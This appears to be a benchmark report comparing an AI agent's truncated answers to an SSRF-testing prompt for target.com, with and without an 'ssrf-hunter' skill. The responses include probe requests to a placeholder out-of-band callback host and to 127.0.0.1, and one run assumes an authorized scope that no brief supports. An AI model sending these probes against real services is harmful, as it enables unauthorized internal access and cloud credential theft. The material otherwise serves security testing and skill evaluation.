---
skill: ssrf-hunter
tested-on: claude CLI (claude-sonnet-4-6)
date: 2026-05-20
---

# Benchmark: ssrf-hunter

> Real numbers. Same prompt. Same model. Skill on vs skill off.

---

## Results

| Metric | Without Skill | With Skill | Improvement |
|---|---|---|---|
| Turns to complete | 1 | 1 | **⚪ 0%** |
| Total tokens | ~5,001 | ~1,953 | **🟢 -61%** |
| Time | 107s | 45s | **🟢 -58%** |
| Output quality | Complete | Complete | |

---

## Scenario

```
Test for SSRF on target.com — there is a URL fetch feature at /api/fetch?url= that retrieves remote content and renders it inline
```

---

## Without Skill — 1 turn required

The agent received the prompt with no skill loaded. It improvised.

#### Turn 1

**Prompt**
> Test for SSRF on target.com — there is a URL fetch feature at /api/fetch?url= that retrieves remote content and renders it inline

**Response**
```
Working through each phase sequentially. No actual requests will be fired — I'll produce the exact commands and payloads for you to run under your authorized engagement.

---

## Phase 1: SCOPE

**Assumptions (no program brief provided — annotate with real brief before submitting):**

| Item | Status |
|---|---|
| In-scope asset | `target.com` and its subdomains |
| Tested endpoint | `/api/fetch?url=` |
| Accepted impact | Internal network access, cloud metadata, credential theft, RCE-via-SSRF |
| Never-submit | DoS, automated scanning beyond rate limits, exfiltrating real PII |
| Special rules | Assume: no automated scanning without permission; use Burp/curl manually |

**Gate ✓** — You are allowed to manually probe `/api/fetch?url=` for SSRF on `target.com`; you are not allowed to run scanners, cause downtime, or hit out-of-scope assets.

---

## Phase 2: RECON

Enumerate subdomains and technologies before touching the endpoint.

```bash
# Passive subdomain enum
curl -s "https://crt.
... [truncated]
```

---

## With Skill — 1 turn, complete

The agent received the same prompt with `ssrf-hunter` loaded as context.

#### Turn 1

**Prompt**
> Test for SSRF on target.com — there is a URL fetch feature at /api/fetch?url= that retrieves remote content and renders it inline

**Response**
```
Here's a structured SSRF test against `target.com/api/fetch?url=` following the full methodology.

---

## Phase 1 — Injection Point Confirmed

The target is already identified:
```
GET /api/fetch?url=https://example.com HTTP/1.1
Host: target.com
```
The feature "retrieves remote content and renders it inline" — meaning this is likely **non-blind SSRF** if exploitable. Response body should reflect fetched content directly.

---

## Phase 2 — Baseline Confirmation

**Step 1: OOB callback (confirm the server makes outbound requests)**
```http
GET /api/fetch?url=https://YOUR-ID.oastify.com HTTP/1.1
Host: target.com
```
- DNS hit only → blind SSRF
- HTTP hit → full SSRF confirmed
- No hit → blocked outbound, move to bypasses

**Step 2: Loopback self-request**
```http
GET /api/fetch?url=http://127.0.0.1/ HTTP/1.1
Host: target.com
```
- `200` with app content → SSRF confirmed, server is fetching localhost
- `502` / `Connection refused` → server attempted it (SSRF exists, nothing listening on
... [truncated]
```

---

## What changed

Both runs completed in 1 turn. The skill ensured consistent structure and methodology coverage — without it, output quality depends on the agent improvising correctly every time.

With the skill, the agent followed a proven methodology from the first prompt.

---
